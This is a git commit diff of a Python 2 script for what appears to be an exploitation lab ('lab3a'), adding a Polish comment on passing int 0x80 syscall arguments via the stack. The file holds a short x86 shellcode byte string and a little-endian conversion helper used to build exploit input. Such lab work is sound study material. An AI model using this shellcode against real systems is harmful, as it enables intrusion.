9bb5294bd1840ceb1f0572d50773c2fe9b678611
Kamil Frankowicz <fumfi.255@gmail.com>
2018-01-16 09:16:00 +0100

    Update lab3a_new.py

--- lab3a_new.py
+++ lab3a_new.py
@@ -1,7 +1,7 @@
 #!/usr/bin/python2.7
 
 SHELLCODE = "\x5e\x59\x59\x58\x56\x51\x89\xe3\x89\xf9\x89\xfa\xcd\x80"
-
+# Jezeli jest malo miejsca na ukrycie parametrow wywolania INT 80 mozna je zapisac na stosie a pozniej zrzucac za pomoca popow
 
 def convert_to_int_le(string):
     return str(int(string[::-1].encode('hex'), 16))
